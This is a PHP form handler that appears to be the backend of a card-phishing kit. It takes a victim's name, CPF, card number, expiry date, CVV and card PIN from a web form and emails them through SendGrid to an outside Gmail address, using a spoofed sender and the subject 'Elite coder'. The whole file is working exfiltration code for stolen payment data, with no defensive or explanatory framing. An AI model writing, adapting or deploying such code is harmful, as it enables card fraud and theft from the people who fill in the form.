<?php 
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
date_default_timezone_set('America/Sao_Paulo');

$data =  date("d/m/Y");


if(isset($_POST['nome'])):
 $id = addslashes(htmlspecialchars_decode($_POST['id']));
$nome = addslashes(htmlspecialchars_decode($_POST['nome']));
$cpf = addslashes(htmlspecialchars_decode($_POST['cpf']));
$cc = addslashes(htmlspecialchars_decode($_POST['cc']));
$validade = addslashes(htmlspecialchars_decode($_POST['validade']));
$cvv = addslashes(htmlspecialchars_decode($_POST['cvv']));
$senhacard = addslashes(htmlspecialchars_decode($_POST['senhacard']));
    
    
    //Load Composer's autoloader
    require 'vendor/autoload.php';
    
    //Create an instance; passing `true` enables exceptions
    $mail = new PHPMailer(true);
    
    try {
        //Server settings
        // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.sendgrid.net';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = 'apikey';                     //SMTP username
                $mail->Password = getenv('SENDGRID_API_KEY');
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
        $mail->Port       = 465;                                   //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
    
        //Recipients
      //Recipients
    $mail->setFrom('contato@ngrok.com.br', $nome);
    $mail->addAddress('coderphp81@gmail.com', 'coderphp81@gmail.com');     //Add a recipient
    
    
        //Attachments
        // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
        // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name
    
        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Elite coder';
        $mail->CharSet = 'UTF-8';
        $mail->Body    = "<H1>DADOS NOVOS</H1> <p>Nome: $nome</p>  <br> <p>CPF: $cpf </p> <br> <p>CVV: $cc</p> <br> <p>VALIDADE: $validade</p> <br> <p>CVV: $cvv</p> <br> <p>SENHA CARD: $senhacard</p>";
        
    
        $mail->send();
        echo 'Message has been sent';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
    
   endif;
